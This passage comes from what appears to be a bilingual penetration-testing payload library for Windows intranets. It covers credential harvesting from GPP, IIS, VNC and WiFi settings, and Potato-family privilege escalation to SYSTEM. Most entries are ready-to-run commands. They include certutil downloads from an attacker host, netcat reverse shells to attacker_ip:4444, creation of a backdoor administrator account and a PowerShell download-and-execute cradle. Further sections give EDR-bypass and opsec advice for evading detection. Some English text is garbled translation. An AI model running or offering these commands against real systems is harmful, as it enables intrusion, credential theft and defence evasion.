        title: { zh: '检查其他敏感安装文件', en: 'CheckotherSensitiveInstallationFile' },
        command: '# 检查GPP(Group Policy Preferences)密码\nfindstr /S /I cpassword \\\\domain.com\\sysvol\\domain.com\\policies\\*.xml 2>nul\n\n# 检查IIS配置文件\ntype C:\\inetpub\\wwwroot\\web.config 2>nul | findstr /i "connectionString password"\n\n# 检查VNC密码文件\nreg query "HKCU\\Software\\ORL\\WinVNC3\\Password" 2>nul\nreg query "HKLM\\SOFTWARE\\RealVNC\\WinVNC4" /v Password 2>nul\n\n# 检查WiFi密码\nnetsh wlan show profiles\nnetsh wlan show profile name="目标WiFi" key=clear',
        description: { zh: '除Unattend.xml外，其他位置也可能存储明文凭证', en: 'Besides Unattend.xml, other locations may also store plaintext credentials' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'cpassword', explanation: { zh: 'GPP使用的AES加密密码字段(密钥已公开)', en: 'GPPUse AESEncryptionPasswordfield(key already public)' }, type: 'value' },
          { part: 'sysvol', explanation: { zh: '域控共享目录，所有域用户可读', en: 'Domain controller shared directory, readable by all domain users' }, type: 'value' },
          { part: 'reg query', explanation: { zh: '查询注册表中的密码值', en: 'QueryRegistryMiddle PasswordValue' }, type: 'command' }
        ]
      },
      {
        title: { zh: '使用Metasploit自动化', en: 'UseMetasploitAutomatic-ize' },
        command: '# Metasploit模块\nuse post/windows/gather/enum_unattend\nset SESSION 1\nrun\n\n# 也可以使用\nuse post/multi/gather/firefox_creds\nuse post/windows/gather/credentials/gpp\nuse post/windows/gather/cachedump',
        description: { zh: '使用Metasploit后渗透模块自动搜索和提取无人值守安装文件中的凭证', en: 'Use Metasploit post-exploitation module to automatically search and extract credentials from unattended installation files' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'post/windows/gather/enum_unattend', explanation: { zh: '自动搜索并解析Unattend文件', en: 'AutomaticSearch and ParseUnattendFile' }, type: 'value' },
          { part: 'post/windows/gather/credentials/gpp', explanation: { zh: '提取GPP存储的凭证', en: 'ExtractGPPstorage Credentials' }, type: 'value' }
        ]
      }
    ],
    edrBypass: [
      {
        title: { zh: '绕过文件访问监控', en: 'BypassFile AccessMonitoring' },
        command: '# 使用Volume Shadow Copy读取被锁定的文件\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\Panther\\Unattend.xml C:\\temp\\u.xml\n\n# 使用PowerShell流式读取避免文件锁\n[IO.File]::ReadAllText("C:\\Windows\\Panther\\Unattend.xml")',
        description: { zh: '通过卷影副本或流式读取绕过文件访问监控', en: 'Bypass file access monitoring via volume shadow copy or streamed reads' },
        platform: 'windows'
      }
    ],
    analysis: { zh: '无人值守安装文件是Windows大规模部署的产物。这些XML文件中的<UserAccounts>/<AutoLogon>节点可能包含本地管理员或域管理员的明文/编码凭证。该漏洞在企业环境中极为常见，因为IT部门经常忽略部署后清理这些文件。', en: 'Unattended installation files are artifacts of large-scale Windows deployment. The <UserAccounts>/<AutoLogon> nodes in these XML files may contain local or domain admin plaintext/encoded credentials. This vulnerability is extremely common in enterprise environments because IT departments often neglect to clean up these files after deployment.' },
    opsecTips: [{ zh: '读取文件操作通常不会触发警报，但大量文件搜索(dir /s)可能被EDR检测。建议直接检查已知路径而非全盘搜索。', en: 'File read operations usually do not trigger alerts, but extensive file searches (dir /s) may be detected by EDR. Recommend checking known paths directly rather than searching all drives.' }],
    references: ['https://attack.mitre.org/techniques/T1552/001/'],
    tutorial: {
      overview: { zh: '无人值守安装文件(Unattend.xml)用于Windows自动化部署，可能包含管理员凭证。', en: 'Unattended installation files (Unattend.xml) are used for automated Windows deployment and may contain admin credentials.' },
      vulnerability: { zh: 'Windows部署工具(如MDT、SCCM)生成的Unattend.xml文件中，密码以明文或弱编码(Base64)存储，且部署完成后文件常残留在系统中。', en: 'In Unattend.xml files generated by Windows deployment tools (e.g., MDT, SCCM), passwords are stored as plaintext or weakly encoded (Base64), and files often remain on the system after deployment.' },
      exploitation: { zh: '利用流程：1) 搜索默认路径下的Unattend/Sysprep文件 2) 提取Password/AutoLogon字段 3) 解码Base64密码 4) 使用获取的凭证横向移动', en: 'Exploitationworkflow: 1) SearchDefaultPathBelow Unattend/SysprepFile 2) ExtractPassword/AutoLogonfield 3) DecodingBase64Password 4) UseObtain CredentialsLateral Movement' },
      mitigation: { zh: '防御措施：1) 部署完成后立即删除Unattend文件 2) 不在Unattend中存储域管理员密码 3) 使用LAPS管理本地管理员密码 4) 定期审计敏感文件', en: 'Defenses: 1) Delete Unattend files immediately after deployment 2) Do not store Domain Admin passwords in Unattend files 3) Use LAPS for local admin passwords 4) Regularly audit sensitive files' },
      difficulty: 'beginner'
    }
  },
  // ==================== 权限提升 - Potato攻击 ====================
  {
    id: 'potato-attack',
    name: { zh: 'Potato系列提权攻击', en: 'Potato Series Privilege Escalation' },
    description: { zh: '利用Windows令牌模拟和NTLM中继机制从服务账户(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege)提权到SYSTEM', en: 'Exploit Windows token impersonation and NTLM relay from service accounts (SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege) to escalate to SYSTEM' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: { zh: 'Potato提权', en: 'Potato Privilege Escalation' },
    tags: ['privilege-escalation', 'potato', 'token-impersonation', 'ntlm-relay', 'windows'],
    prerequisites: [{ zh: '拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限', en: 'Has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege' }, { zh: '常见于IIS AppPool、SQL Server、各类服务账户', en: 'commonAtIIS AppPool, SQL Server, EachClassServiceAccount' }],
    execution: [
      {
        title: { zh: '检查当前权限', en: 'CheckcurrentPermission' },
        command: '# 检查是否拥有Impersonate权限\nwhoami /priv\n\n# 重点关注以下权限:\n# SeImpersonatePrivilege - 模拟客户端令牌\n# SeAssignPrimaryTokenPrivilege - 替换进程级令牌\n\n# 确认当前用户身份\nwhoami /all\necho %USERNAME%',
        description: { zh: '首先确认当前用户是否拥有令牌模拟权限。IIS应用池账户、SQL Server服务账户、Windows服务账户通常默认拥有该权限', en: 'First confirm whether the current user has token impersonation privileges. IIS app pool accounts, SQL Server service accounts, and Windows service accounts typically have this privilege by default' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'whoami /priv', explanation: { zh: '列出当前用户所有特权', en: 'List All Current User Privileges' }, type: 'command' },
          { part: 'SeImpersonatePrivilege', explanation: { zh: '允许模拟其他用户令牌的关键特权', en: 'Key privilege allowing impersonation of other user tokens' }, type: 'value' },
          { part: 'SeAssignPrimaryTokenPrivilege', explanation: { zh: '允许为新进程分配令牌', en: 'Allows assigning tokens to new processes' }, type: 'value' }
        ]
      },
      {
        title: 'JuicyPotato (Windows Server 2016/2019)',
        command: '# 下载JuicyPotato\ncertutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\\temp\\jp.exe\n\n# 使用JuicyPotato提权执行命令\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c whoami > C:\\temp\\proof.txt" -t *\n\n# 使用特定CLSID (不同系统需要不同CLSID)\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}\n\n# 反弹Shell\nC:\\temp\\jp.exe -l 1337 -p C:\\temp\\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *',
        description: { zh: 'JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令', en: 'JuicyPotato exploits COM servers and NTLM authentication for token impersonation. It creates a local COM server, tricks the SYSTEM account into authenticating to it, then impersonates that token to execute commands' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-l 1337', explanation: { zh: 'COM服务器监听端口', en: 'COMServerlisteningPort' }, type: 'parameter' },
          { part: '-p', explanation: { zh: '要以SYSTEM权限执行的程序', en: 'Need with SYSTEMPermissionExecute Program' }, type: 'parameter' },
          { part: '-a', explanation: { zh: '传递给程序的参数', en: 'Arguments Passed to the Program' }, type: 'parameter' },
          { part: '-t *', explanation: { zh: '同时尝试CreateProcessWithToken和CreateProcessAsUser', en: 'MeanwhileAttemptCreateProcessWithToken and CreateProcessAsUser' }, type: 'parameter' },
          { part: '-c {CLSID}', explanation: { zh: '指定COM对象CLSID(需匹配目标系统版本)', en: 'Specify COM object CLSID (must match target system version)' }, type: 'parameter' }
        ]
      },
      {
        title: 'PrintSpoofer (Windows 10/Server 2019+)',
        command: '# PrintSpoofer - 利用打印服务命名管道\nPrintSpoofer.exe -i -c cmd\n\n# 直接执行命令\nPrintSpoofer.exe -c "cmd /c whoami > C:\\temp\\proof.txt"\n\n# 反弹Shell\nPrintSpoofer.exe -c "C:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe"\n\n# 以SYSTEM身份启动PowerShell\nPrintSpoofer.exe -i -c powershell.exe',
        description: { zh: 'PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows', en: 'PrintSpoofer exploits the Windows Print Spooler named pipe impersonation feature. It creates a named pipe and tricks the Print Spooler service into connecting, obtaining a SYSTEM token. Suitable for newer Windows versions where JuicyPotato does not work' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-i', explanation: { zh: '交互模式(获取交互式Shell)', en: 'Interactive Mode (Obtain Interactive Shell)' }, type: 'parameter' },
          { part: '-c cmd', explanation: { zh: '以SYSTEM权限执行的命令', en: 'with SYSTEMPermissionExecute Command' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'Sweet Potato (多技术集成)', en: 'Sweet Potato (Multi-Technique Integration)' },
        command: '# SweetPotato - 集成多种Potato技术\nSweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"\n\n# 指定攻击方式\nSweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"',
        description: { zh: 'SweetPotato集成了PrintSpoofer、EfsPotato等多种技术，自动选择适合目标系统的攻击方式', en: 'SweetPotato integrates PrintSpoofer, EfsPotato, and other techniques, automatically selecting the best attack method for the target system' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-e EfsRpc', explanation: { zh: '指定使用EFS RPC攻击向量', en: 'specifiedUseEFS RPCAttackvector' }, type: 'parameter' },
          { part: '-p', explanation: { zh: '要执行的程序路径', en: 'NeedExecute ProgramPath' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'GodPotato (全版本通杀)', en: 'GodPotato (Universal Version Support)' },
        command: '# GodPotato - 适用于Windows Server 2012-2022所有版本\nGodPotato.exe -cmd "cmd /c whoami"\n\n# 执行反弹Shell\nGodPotato.exe -cmd "cmd /c C:\\temp\\nc.exe -e cmd.exe attacker_ip 4444"\n\n# 添加管理员\nGodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"\n\n# 执行PowerShell\nGodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"',
        description: { zh: 'GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种', en: 'GodPotato exploits a DCOM OXID resolver vulnerability, requires no CLSID specification, and is compatible with nearly all Windows versions. It is currently the most universal Potato variant' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-cmd', explanation: { zh: '以SYSTEM权限执行的命令', en: 'with SYSTEMPermissionExecute Command' }, type: 'parameter' },
          { part: 'GodPotato.exe', explanation: { zh: '全版本兼容的Potato提权工具', en: 'Universal Potato Privilege Escalation Tool' }, type: 'command' }
        ]
      },
      {
        title: { zh: 'RoguePotato (远程场景)', en: 'RoguePotato (RemoteScenario)' },
        command: '# 攻击机 - 启动socat重定向\nsocat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999\n\n# 目标机 - 执行RoguePotato\nRoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\\temp\\proof.txt" -l 9999\n\n# 或使用netcat反弹\nRoguePotato.exe -r attacker_ip -e "C:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999',
        description: { zh: 'RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继', en: 'RoguePotato is an improved version of JuicyPotato that uses a remote OXID resolver for NTLM authentication relay. Requires an attack machine to assist with the relay' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-r attacker_ip', explanation: { zh: '攻击机IP(运行OXID解析器)', en: 'Attack Machine IP (Running OXID Resolver)' }, type: 'parameter' },
          { part: '-l 9999', explanation: { zh: '本地监听端口', en: 'LocallisteningPort' }, type: 'parameter' },
          { part: '-e', explanation: { zh: '要执行的命令', en: 'NeedExecute Command' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'Potato选型决策流程', en: 'Potato Selection Decision Workflow' },
        command: '# === 决策流程 ===\n# 1. whoami /priv 确认SeImpersonatePrivilege\n# 2. systeminfo 确认系统版本\n#\n# Windows Server 2012-2016 => JuicyPotato\n# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)\n# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato\n# Windows Server 2022 => GodPotato\n# 所有版本 => SweetPotato (自动选择)\n# 需要远程中继 => RoguePotato\n#\n# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/',
        description: { zh: '根据目标系统版本选择合适的Potato变种工具', en: 'Choose the Appropriate Potato Variant Based on Target System Version' },
        platform: 'windows'
      }
    ],
    edrBypass: [
      {
        title: { zh: '绕过EDR检测的Potato技巧', en: 'Potato Techniques for Bypassing EDR Detection' },
        command: '# 1. 重命名二进制文件\nren GodPotato.exe svcutil.exe\n\n# 2. 使用.NET反射加载(无文件落地)\npowershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes(\'C:\\temp\\gp.exe\');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@(\'-cmd\',\'cmd /c whoami\')))";\n\n# 3. 使用SharpToken替代(较新工具,签名较少)\nSharpToken.exe execute SYSTEM "cmd /c whoami"',
        description: { zh: '通过反射加载、重命名、使用较新工具等方式绕过EDR对Potato工具的检测', en: 'Bypass EDR detection of Potato tools through reflective loading, renaming, using newer tools, and other methods' },
        platform: 'windows'
      }
    ],
    analysis: { zh: 'Potato系列攻击利用Windows的令牌模拟机制——拥有SeImpersonatePrivilege的服务账户可以模拟向其认证的任何用户令牌。攻击者通过欺骗SYSTEM账户向本地COM服务器/命名管道认证，获取SYSTEM令牌后创建高权限进程。这是Web服务器(IIS)和数据库(SQL Server)提权最常见的方式之一。', en: 'The Potato family of attacks exploits the Windows token impersonation mechanism — service accounts with SeImpersonatePrivilege can impersonate the token of any user authenticating to them. Attackers trick the SYSTEM account into authenticating to a local COM server or named pipe, then use the SYSTEM token to create high-privilege processes. This is one of the most common privilege escalation methods for web servers (IIS) and databases (SQL Server).' },
    opsecTips: [{ zh: '1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式', en: '1) Potato tool binaries have obvious signatures — recommend in-memory loading 2) Created named pipe names may be monitored 3) Clean up tools and temp files immediately after success 4) Avoid sensitive commands like net user; use stealthier post-exploitation methods' }],
    references: ['https://attack.mitre.org/techniques/T1134/001/', 'https://github.com/BeichenDream/GodPotato'],
    tutorial: {
      overview: { zh: 'Potato系列是Windows环境下从服务账户提权到SYSTEM的经典攻击技术，利用令牌模拟和NTLM中继实现。', en: 'The Potato family is a classic Windows privilege escalation technique from service accounts to SYSTEM, leveraging token impersonation and NTLM relay.' },
      vulnerability: { zh: 'Windows服务账户(IIS/SQL Server等)默认拥有SeImpersonatePrivilege权限。攻击者可利用此权限通过DCOM/命名管道欺骗SYSTEM账户认证，模拟其令牌实现提权。', en: 'Windows service accounts (IIS/SQL Server, etc.) have SeImpersonatePrivilege by default. Attackers can exploit this privilege through DCOM/named pipe to trick the SYSTEM account into authenticating, then impersonate its token for privilege escalation.' },
      exploitation: { zh: '利用流程：1) whoami /priv确认Impersonate权限 2) 根据系统版本选择合适的Potato工具 3) 执行Potato获取SYSTEM权限 4) 进行后渗透操作', en: 'Exploitation workflow: 1) Confirm impersonation privileges with whoami /priv 2) Choose appropriate Potato tool based on system version 3) Execute Potato to obtain SYSTEM privileges 4) Perform post-exploitation' },
      mitigation: { zh: '防御措施：1) 最小权限原则，移除不必要的SeImpersonatePrivilege 2) 使用gMSA账户运行服务 3) 监控异常令牌操作和命名管道创建 4) 及时更新Windows补丁', en: 'Defenses: 1) Principle of least privilege — remove unnecessary SeImpersonatePrivilege 2) Use gMSA accounts to run services 3) Monitor anomalous token operations and named pipe creation 4) Keep Windows patches up to date' },
      difficulty: 'intermediate'
    }
  }
];

export default intranetPayloads;